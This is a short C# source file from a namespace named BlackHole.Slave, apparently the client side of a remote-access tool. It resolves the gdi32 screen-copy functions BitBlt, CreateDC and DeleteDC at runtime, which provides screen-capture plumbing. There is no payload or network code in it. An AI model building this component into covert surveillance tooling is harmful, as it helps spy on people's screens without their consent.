using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.ConstrainedExecution;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;

namespace BlackHole.Slave
{
    public static class Win32
    {
        public const int ROP_COPY = 0x00CC0020;

        [UnmanagedFunctionPointer(CallingConvention.Winapi)]
        public delegate bool BitBlt([In] IntPtr hdc, int xDest, int yDest, int width, int height, [In] IntPtr hdcSrc, int xSrc, int ySrc, int rop);
        [UnmanagedFunctionPointer(CallingConvention.Winapi)]
        public delegate IntPtr CreateDC(string driver, string device, string output, IntPtr initData);
        [UnmanagedFunctionPointer(CallingConvention.Winapi)]
        public delegate bool DeleteDC([In] IntPtr hdc);
        
        public static BitBlt gdi32_BitBlt = DynamicNativeCall<BitBlt>("gdi32.dll", "BitBlt");
        public static CreateDC gdi32_CreateDC = DynamicNativeCall<CreateDC>("gdi32.dll", "CreateDCA");        
        public static DeleteDC gdi32_DeleteDC = DynamicNativeCall<DeleteDC>("gdi32.dll", "DeleteDC");

        /// <summary>
        /// 
        /// </summary>
        /// <typeparam name="TFunc"></typeparam>
        /// <typeparam name="TOut"></typeparam>
        /// <param name="fileName"></param>
        /// <param name="functionName"></param>
        /// <param name="callback"></param>
        public static TFunc DynamicNativeCall<TFunc>(string fileName, string functionName) where TFunc : class
        {
            using (var nativeLibrary = new DynamicNativeLibrary(fileName))            
                return nativeLibrary.FindUmanagedFunction<TFunc>(functionName);            
        }
    }
}
